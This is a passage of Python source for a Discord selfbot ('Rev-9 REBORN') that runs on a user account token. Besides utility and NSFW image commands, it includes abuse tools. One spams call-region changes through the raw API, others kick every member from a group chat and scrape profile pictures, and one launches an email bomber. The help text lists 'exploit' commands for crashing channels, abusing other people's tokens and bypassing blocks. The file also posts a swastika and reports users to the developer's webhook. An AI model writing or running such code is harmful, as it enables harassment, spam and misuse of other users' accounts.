        if relationship is discord.RelationshipType.friend:
            await relationship.delete()

@Rev9.command()
async def clearblocked(ctx): # b'\xfc'
    await ctx.message.delete()
    print(Rev9.user.relationships)
    for relationship in Rev9.user.relationships:
        if relationship is discord.RelationshipType.blocked:
            print(relationship)
            await relationship.delete()

@Rev9.command()
async def changeregions(ctx, amount: int): # b'\xfc'
    await ctx.message.delete()
    if isinstance(ctx.channel, discord.GroupChannel):
        token = config.get('token')
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
        }
        indian_payload = {'region': 'japan'}
        brazil_payload = {'region': 'brazil'}
        japan_payload = {'region': 'japan'}
        russian_payload = {'region': 'russia'}
        for _i in range(amount):
            requests.patch(f'https://discord.com/api/v8/channels/{ctx.channel.id}/call', json=indian_payload,headers=headers)
            await asyncio.sleep(3)
            requests.patch(f'https://discord.com/api/v8/channels/{ctx.channel.id}/call', json=brazil_payload,headers=headers)
            await asyncio.sleep(3)
            requests.patch(f'https://discord.com/api/v8/channels/{ctx.channel.id}/call', json=japan_payload,headers=headers)
            await asyncio.sleep(3)
            r = requests.patch(f'https://discord.com/api/v8/channels/{ctx.channel.id}/call', json=russian_payload,headers=headers).text
            await asyncio.sleep(3)
            print(r)

@Rev9.command()
async def kickallgc(ctx): # b'\xfc'
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        for recipient in ctx.message.channel.recipients:
            await ctx.message.channel.remove_recipients(recipient)

@Rev9.command()
async def stopactivity(ctx): # b'\xfc'
    await ctx.message.delete()
    embed = discord.Embed(description = f'**Successfully stopped your current activity.**', color=000000)
    embed.set_footer(text=promote)
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    await ctx.send(embed = embed, delete_after=deltime)
    await Rev9.change_presence(activity=None, status=discord.Status.dnd)

@Rev9.command()
async def leavegc(ctx): # b'\xfc'
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        await ctx.message.channel.leave()

@Rev9.command()
async def code(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('`' + message + "`")

@Rev9.command()
async def quote(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('> ' + message)

@Rev9.command()
async def strike(ctx, *, message):
    await ctx.message.delete()
    await ctx.send('~~' + message + '~~')

@Rev9.command()
async def massreact(ctx, emote): # b'\xfc'
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=50).flatten()
    for message in messages:
        await message.add_reaction(emote)

@Rev9.command(aliases=['serverbanner'])
async def banner(ctx): # b'\xfc'
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.banner_url)
    em.set_footer(text=promote)
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def mac(ctx, mac): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('http://api.macvendors.com/' + mac)
    em = discord.Embed(title='MAC Lookup Result', description=r.text, colour=0xDEADBF)
    em.set_author(name='MAC Finder', icon_url='https://regmedia.co.uk/2016/09/22/wifi_icon_shutterstock.jpg?x=1200&y=794')
    em.set_footer(text=promote)
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def abc(ctx): # b'\xfc'
    await ctx.message.delete()
    ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    message = await ctx.send(ABC[0])
    await asyncio.sleep(1.5)
    for _next in ABC[1:]:
        await message.edit(content=_next)
        await asyncio.sleep(2)

@Rev9.command(aliases=['flip', 'coin'])
async def coinflip(ctx): # b'\xfc'
    await ctx.message.delete()
    coinsides = ['Heads', 'Tails']
    embed = discord.Embed(description=f"Your coin landed on {random.choice(coinsides)}", colour = 000000)
    embed.set_thumbnail(url="https://bootstraplogos.com/wp-content/uploads/edd/2018/10/logo-4.png")
    embed.set_footer(text=promote)
    await ctx.send(embed=embed, delete_after=deltime)

@Rev9.command()
async def howgay(ctx, *, name=''):
    await ctx.message.delete()
    embed = discord.Embed(
        title = 'Gay Rate Machine',
        description = ':rainbow_flag: Calculating...',
        colour = 000000
    )
    embed.set_footer(text = promote)
    sent = await ctx.send(embed = embed, delete_after=deltime)

    await asyncio.sleep(2)
    
    number = random.randrange(0, 100)
    desc = ''
    if name == '':
        desc = f'You are {number}% gay :rainbow_flag:'   
    else:
        desc = f'{name} is {number}% gay :rainbow_flag:'       
    embed1 = discord.Embed(
        title = 'Gay Rate Machine',description = desc, colour = 000000)
    embed1.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    embed1.set_footer(text = promote)
    await sent.edit(embed = embed1, delete_after=deltime)

@Rev9.command(aliases=['bitcoin'])
async def btc(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    em.set_footer(text=promote)
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command(aliases=['ethereum'])
async def eth(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Ethereum', icon_url='https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png')
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    em.set_footer(text = promote)
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def topic(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/generator.php').content
    soup = bs4(r, 'html.parser')
    topic = soup.find(id="random").text
    await ctx.send(topic)

@Rev9.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
async def wyr(ctx): 
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qb = soup.find(id='qb').text
    embed = discord.Embed(title = 'Would You Rather?', description = f'```🅰 = {qa}```\n\n**OR**\n\n```🅱 = {qb}```', colour=0x0000)
    embed.set_footer(text=promote)
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    message = await ctx.send(embed = embed, delete_after=deltime)
    await message.add_reaction("🅰")
    await message.add_reaction("🅱")

@Rev9.command()
async def hastebin(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    r = requests.post("https://hastebin.com/documents", data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")

@Rev9.command()
async def ascii(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```'+r+'```') > 2000:
        return
    await ctx.send(f"```{r}```")

@Rev9.command(aliases = ['bigemoji'])
async def emoji(ctx, emoji: discord.Emoji = None): # b'\xfc'
    await ctx.message.delete()
    if emoji == None:
        await ctx.send("**You have to specify an emoji to enlarge.**")
        return
    await ctx.send(emoji.url)

#@Rev9.command()
#async def anal(ctx): # b'\xfc'
#    await ctx.message.delete()
#    r = requests.get("https://nekos.life/api/v2/img/anal")
#    res = r.json()
#    em = discord.Embed()   
#    em.set_image(url=res['url'])
#    em.set_footer(text = promote)
#    await ctx.send(embed=em, delete_after=deltime)   

@Rev9.command()
async def erofeet(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/erofeet")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    em.set_footer(text = promote)
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def feet(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feetg")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    em.set_footer(text = promote)
    await ctx.send(embed=em, delete_after=deltime)

#@Rev9.command()
#async def hentai(ctx): # b'\xfc'
#    await ctx.message.delete()
#    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
#    res = r.json()
#    em = discord.Embed()
#    em.set_image(url=res['url'])
#    em.set_footer(text = promote)
#    await ctx.send(embed=em, delete_after=deltime)   

#@Rev9.command()
#async def boobs(ctx): # b'\xfc'
#    await ctx.message.delete()
#    r = requests.get("https://nekos.life/api/v2/img/boobs")
#    res = r.json()
#    em = discord.Embed()
#    em.set_image(url=res['url'])
#    em.set_footer(text = promote)
#    await ctx.send(embed=em)

@Rev9.command()
async def tits(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    em = discord.Embed()    
    em.set_image(url=res['url'])
    em.set_footer(text = promote)
    await ctx.send(embed=em, delete_after=deltime)


@Rev9.command()
async def blowjob(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    em.set_footer(text = promote)
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def lewdneko(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    em.set_footer(text = promote)
    await ctx.send(embed=em, delete_after=deltime)   

@Rev9.command()
async def lesbian(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    em.set_footer(text = promote)
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()  
async def feed(ctx, user: discord.Member=None): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feed")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    em.set_footer(text = promote)
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def tickle(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tickle")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def slap(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    em.set_footer(text = promote)
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def hug(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    em.set_footer(text = promote)
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def smug(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/smug")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    em.set_footer(text = promote)
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def pat(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    em.set_footer(text = promote)
    await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def kiss(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    em.set_footer(text = promote)
    await ctx.send(embed=em, delete_after=deltime)


@Rev9.command(aliases=['proxy'])
async def proxies(ctx): # b'\xfc'
    await ctx.message.delete()
    file = open("Data/Http-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Https-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
             proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Socks4-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Socks5-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")

@Rev9.command()
async def uptime(ctx): # b'\xfc'
    await ctx.message.delete()
    uptime = datetime.datetime.utcnow() - start_time
    uptime = str(uptime).split('.')[0]
    embed = discord.Embed(title = f'**Rev-9 Uptime:**', description = f"{uptime}", color=000000)
    embed.set_footer(text=promote)
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    await ctx.send(embed = embed, delete_after=deltime)

@Rev9.command()
async def purge(ctx, amount: int): # b'\xfc'
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Rev9.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass

@Rev9.command(name='group-leaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups'])
async def _group_leaver(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in Rev9.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()

@Rev9.command()
async def cmdhelp(ctx): # b'\xfc'
    await ctx.message.delete()
    url = 'https://rev-9.cloudflare.sexy/s/68ce19ac3f'
    r = requests.get(url)
    if r.status_code == 200:
        webbrowser.open(url)
    else:
        print('Page is currently under maintenance, our team will announce when the page is back online')  

@Rev9.command()
async def porn(ctx): # b'\xfc'
    await ctx.message.delete()
    url = 'https://www.pornhub.com'
    r = requests.get(url)
    if r.status_code == 200:
        webbrowser.open(url)
    else:
        print('Page is currently under maintenance, our team will announce when the page is back online') 

@Rev9.command()
async def poll(ctx, *, message=''): # b'\xfc'
        await ctx.message.delete()
        if message == '':
            await ctx.send('**Please specify a question or topic.**')
        else:
            embed = discord.Embed(
                description = message,
                colour = 000000,
            )
            embed.set_thumbnail(url='https://img2.pngio.com/download-free-png-poll-png-6-png-image-dlpngcom-poll-png-800_800.jpg')
            embed.set_footer(text='👍 - YES 👎 - NO')
            sent = await ctx.send(embed=embed, delete_after=deltime)
            await sent.add_reaction('👍')
            await sent.add_reaction('👎') 

@Rev9.command()
async def stream(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url=stream_url, 
    )
    embed = discord.Embed(description = f'**Successfully set your status to `Streaming {message}`.**', color=000000)
    embed.set_footer(text=promote)
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    await ctx.send(embed = embed, delete_after=deltime)
    await Rev9.change_presence(activity=stream)

@Rev9.command()
async def playing(ctx, *, game=''): # b'\xfc'
    await ctx.message.delete()
    if game == '':
        embed = discord.Embed(description = f'**You have to specify the game name.**', color=000000)
        embed.set_footer(text=promote)
        return await ctx.send(embed = embed)
    await Rev9.change_presence(activity=discord.Game(name=game))
    embed = discord.Embed(description = f'**Successfully set your status to `playing {game}`.**', color=000000)
    embed.set_footer(text=promote)
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    await ctx.send(embed = embed, delete_after=deltime)

@Rev9.command()
async def listening(ctx, *, listen=''):
    await ctx.message.delete()
    if listen == '':
        embed = discord.Embed(description = f'**You have to specify what you are listening to.**', color=000000)
        embed.set_footer(text=promote)
        return await ctx.send(embed = embed)
    await Rev9.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=listen))
    embed = discord.Embed(description = f'**Successfully set your status to `listening to {listen}`.**', color=000000)
    embed.set_footer(text=promote)
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    await ctx.send(embed = embed, delete_after=deltime)

@Rev9.command()
async def watching(ctx, *, watch=''):  # b'\xfc'
    await ctx.message.delete()
    if watch == '':
        embed = discord.Embed(description = f'**You have to specify what you are watching.**', color=000000)
        embed.set_footer(text=promote)
        return await ctx.send(embed = embed)
    await Rev9.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=watch))
    embed = discord.Embed(description = f'**Successfully set your status to `watching {watch}`.**', color=000000)
    embed.set_footer(text=promote)
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    await ctx.send(embed = embed, delete_after=deltime)


@Rev9.command(aliases=['markasread', 'ack'])
async def read(ctx): # b'\xfc'
    await ctx.message.delete()
    for guild in Rev9.guilds:
        await guild.ack()

@Rev9.command()
async def reverse(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    message = message[::-1]
    await ctx.send(message)

@Rev9.command()
async def shrug(ctx): # b'\xfc'
    await ctx.message.delete()
    shrug = r'¯\_(ツ)_/¯'
    await ctx.send(shrug)

@Rev9.command()
async def swastika(ctx): # b'\xfc'
    await ctx.message.delete()
    swastika = f''' 
░░░░░░░░░░░░░░░▄▀▄░░░░░░░░░░░░░░░
░░░░░░░░░░░░░▄▀░░░▀▄░░░░░░░░░░░░░
░░░░░░░░░░░▄▀░░░░▄▀█░░░░░░░░░░░░░
░░░░░░░░░▄▀░░░░▄▀░▄▀░▄▀▄░░░░░░░░░
░░░░░░░▄▀░░░░▄▀░▄▀░▄▀░░░▀▄░░░░░░░
░░░░░░░█▀▄░░░░▀█░▄▀░░░░░░░▀▄░░░░░
░░░▄▀▄░▀▄░▀▄░░░░▀░░░░▄█▄░░░░▀▄░░░
░▄▀░░░▀▄░▀▄░▀▄░░░░░▄▀░█░▀▄░░░░▀▄░
░█▀▄░░░░▀▄░█▀░░░░░░░▀█░▀▄░▀▄░▄▀█░
░▀▄░▀▄░░░░▀░░░░▄█▄░░░░▀▄░▀▄░█░▄▀░
░░░▀▄░▀▄░░░░░▄▀░█░▀▄░░░░▀▄░▀█▀░░░
░░░░░▀▄░▀▄░▄▀░▄▀░█▀░░░░▄▀█░░░░░░░
░░░░░░░▀▄░█░▄▀░▄▀░░░░▄▀░▄▀░░░░░░░
░░░░░░░░░▀█▀░▄▀░░░░▄▀░▄▀░░░░░░░░░
░░░░░░░░░░░░░█▀▄░▄▀░▄▀░░░░░░░░░░░
░░░░░░░░░░░░░▀▄░█░▄▀░░░░░░░░░░░░░
░░░░░░░░░░░░░░░▀█▀░░░░░░░░░░░░░░░
'''  
    await ctx.send(swastika)

@Rev9.command()
async def lenny(ctx): # b'\xfc'
    await ctx.message.delete()
    lenny = '( ͡° ͜ʖ ͡°)'
    await ctx.send(lenny)

@Rev9.command()
async def tableflip(ctx): # b'\xfc'
    await ctx.message.delete()
    tableflip = '(╯°□°）╯︵ ┻━┻'
    await ctx.send(tableflip)


@Rev9.command()
async def unflip(ctx): # b'\xfc'
    await ctx.message.delete()
    unflip = '┬─┬ ノ( ゜-゜ノ)'
    await ctx.send(unflip)

@Rev9.command()
async def bold(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await ctx.send('**'+message+'**')

@Rev9.command()
async def secret(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await ctx.send('||'+message+'||')

@Rev9.command(name='role-hexcode', aliases=['rolecolor'])
async def _role_hexcode(ctx, *, role: discord.Role): # b'\xfc'
    await ctx.message.delete()
    await ctx.send(f"{role.name} : {role.color}")

@Rev9.command(name='get-hwid', aliases=['hwid', 'gethwid', 'hwidget'])
async def _get_hwid(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f"{Fore.BLUE}[INFO]: {Fore.RED}Your HWID: {Fore.YELLOW}{hwid}"+Fore.RESET)

@Rev9.command()
async def empty(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send(chr(173))

@Rev9.command()
async def logout(ctx): # b'\xfc'
    await ctx.message.delete()
    playsound('Shutdown.mp3')
    async with aiohttp.ClientSession() as session:
        webhook = Webhook.from_url(f'{api}', adapter=AsyncWebhookAdapter(session))
        await webhook.send(f'{alluser} Has stopped using Rev-9 <@806418858167894026>', username='Rev-9')
    await Rev9.logout()

@Rev9.command(aliases=['btc-stream', 'streambtc', 'stream-btc', 'btcstatus'])
async def btcstream(ctx):  # b'\xfc'
    await ctx.message.delete()   
    btc_status.start()    

@Rev9.command(aliases=['timestream'])
async def timestatus(ctx):  # b'\xfc'
    await ctx.message.delete()
    em = discord.Embed(title="Rev-9 Time Streaming", description="Started streaming.")
    em.add_field(name="Mode:", value="Current time.", inline=False)
    em.add_field(name="URL:", value=stream_url)
    em.set_footer(text=promote)
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    await ctx.send(embed=em, delete_after=deltime)
    time_stream.start()    

@Rev9.command(name='steal-all-pfp', aliases=['steal-all-pfps', 'stealallpfps'])
async def _steal_all_pfp(ctx): # b'\xfc'
    await ctx.message.delete()
    Dump(ctx)

@Rev9.command(aliases=['clearconsole', 'consoleclear'])
async def cls(ctx): # b'\xfc'
    await ctx.message.delete()
    Clear()
    startprint()

@Rev9.command()
async def nitro(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send(Nitro())

@Rev9.command(name='gmail-bomb', aliases=['gmail-bomber', 'gmailbomb', 'email-bomber', 'emailbomber'])
async def _gmail_bomb(ctx): # b'\xfc'
    await ctx.message.delete()
    GmailBomber()

@Rev9.command()
async def help(ctx, category=None): # b'\xfc'
    await ctx.message.delete()
    if category is None:
        embed = discord.Embed(color=000000, timestamp=ctx.message.created_at)
        embed.set_author(name="Rev-9 REBORN selfbot. Prefix " + str(Rev9.command_prefix),
                         icon_url=Rev9.user.avatar_url)
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        embed.set_image(url="https://cdn.discordapp.com/attachments/804276663592419348/806219056012197960/tenor_1.gif")
        embed.add_field(name="Main commands", value="https://rev-9.cloudflare.sexy/s/68ce19ac3f", inline=False)
        embed.add_field(name="Made by:", value="Marci and chicken", inline=False)
        await ctx.send(embed=embed, delete_after=deltime)
    elif str(category).lower() == "exploits":
        embed = discord.Embed(color=000000, timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/804276663592419348/806219056012197960/tenor_1.gif")
        embed.description = f"`EXPLOIT COMMANDS`\n`> crash` - Crashes the current channel\n`> Killsb` - Spams embeds that kills msg logger selfbots\n`> fping (users **ID**)` - Pings the user without pinging them\n`> everyone` - Mentions everyone\n`> Vanity (invite) (name)` - Spoofs your invite to a vanity\n`> mbypass` - Sends a 2000 character message\n`> typing` - Spoofs your typing\n`> infotoken (token)` - Shows info of a token\n`> Blockbypass (user)` - way of talking to people who blocked you\n`> unverify (token)` - unverifies the email from the token"
        await ctx.send(embed=embed, delete_after=deltime)
    elif str(category).lower() == "account":
        embed = discord.Embed(color=000000, timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/804276663592419348/806219056012197960/tenor_1.gif")
        embed.description = f"`ACCOUNT COMMANDS`\n`> ps <user>` - steals the users pfp\n`> hypesquad <hypesquad>` - changes your current hypesquad\n`> leavegroups` - leaves all groups that you're in\n`> stream <status>` - sets your streaming status\n`> playing <status>` - sets your playing status\n`> listening <status>` - sets your listening status\n`> watching <status>` - sets your watching status\n`> stopactivity` - resets your status-activity\n`> adminservers` - lists all servers you have perms in\n`> mee6 <on/off>` - auto sends messages in the specified channel\n"
        await ctx.send(embed=embed, delete_after=deltime)

if __name__ == '__main__':
    Init()